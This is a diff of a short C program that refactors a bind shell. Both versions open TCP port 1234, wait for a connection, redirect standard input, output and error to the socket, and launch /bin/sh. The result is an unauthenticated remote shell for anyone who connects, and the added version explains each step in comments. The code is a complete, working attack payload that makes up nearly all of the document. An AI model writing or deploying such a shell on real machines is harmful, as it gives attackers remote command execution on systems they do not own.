@@ -4,52 +4,32 @@
 #include <netinet/in.h>
 #include <unistd.h>
 
-/* Server Listen Port */
-#define PORT 1234
+int main() {
+	const int PORT = 1234;
+	// create standard ipv4 socket
+	int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
 
-void start_bind() {
-	struct sockaddr_in addr;
-	int addrlen = sizeof(addr);
-	int sockfd;
-	int opt = 1;
-	
-	char *argv[] = { "sh", NULL };
+	// define structure to bind server socket to
+	struct sockaddr_in server_addr;
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_addr.s_addr = INADDR_ANY;
+	server_addr.sin_port = htons(PORT);
 
-	sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	if (sockfd < 0)
-		exit(1);
+	// bind server socket to address
+	bind(listen_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
 
-	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) < 0)
-		exit(1);
+	// Listen for connections
+	listen(listen_sock, 0);
 
-	addr.sin_family = AF_INET;
-	addr.sin_addr.s_addr = INADDR_ANY;
-	addr.sin_port = htons(PORT);
+	// Block until a client connects, and set the result fd to conn_sock
+	int conn_sock = accept(listen_sock, NULL, NULL);
 
-	if (bind(sockfd, (struct sockaddr*) &addr, addrlen) < 0)
-		exit(1);
+	// Set stdin, stdout, and stderr to socket fd
+	for (int i = 0; i < 3; i++)
+		dup2(conn_sock, i);
 
-	if (listen(sockfd, 3) < 0)
-		exit(1);
+	// Start shell process, and replace current process with that
+	execve("/bin/sh", NULL, NULL);
 
-	int connection = accept(sockfd, (struct sockaddr*) &addr, (socklen_t*) &addrlen);
-	if (connection < 0) {
-		printf("o no connection bad\n");
-		exit(1);
-	}
-
-	if (dup2(connection, 0) < 0) exit(1); // dupe to stdin
-	if (dup2(connection, 1) < 0) exit(1); // dupe to stdout
-	if (dup2(connection, 2) < 0) exit(1);
-	// if (close(connection) < 0) exit(1);
-
-	execve("/bin/sh", 0, 0);
-
-	close(connection);
-	shutdown(sockfd, SHUT_RDWR);
-}
-
-int main(int argc, char **argv) {
-		start_bind();
-		return 0;
+	return 0;
 }
